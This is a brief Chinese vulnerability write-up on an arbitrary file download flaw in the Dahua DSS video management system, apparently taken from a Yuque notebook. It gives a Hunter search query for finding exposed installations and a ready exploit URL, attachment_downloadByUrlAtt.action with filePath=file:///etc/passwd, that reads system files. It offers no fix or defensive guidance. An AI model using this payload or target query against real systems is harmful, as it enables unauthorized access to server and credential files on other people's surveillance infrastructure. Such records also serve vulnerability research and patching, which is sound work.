# 大华 DSS 视频管理系统 attachment_downloadByUrlAtt.action 任意文件下载漏洞

# 一、漏洞简介
大华 DSS 视频管理系统存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`

![1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc.png](./img/1dbzkkAvGIjPSiqY/1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc-774106.png)

+ 登录页面

![1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590.png](./img/1dbzkkAvGIjPSiqY/1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590-214312.png)

# 四、漏洞复现
```plain
/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```

![1692014263697-ee82b115-ec78-4aa1-89bd-220bac635887.png](./img/1dbzkkAvGIjPSiqY/1692014263697-ee82b115-ec78-4aa1-89bd-220bac635887-605046.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mb3iwwsxiz2bvrek>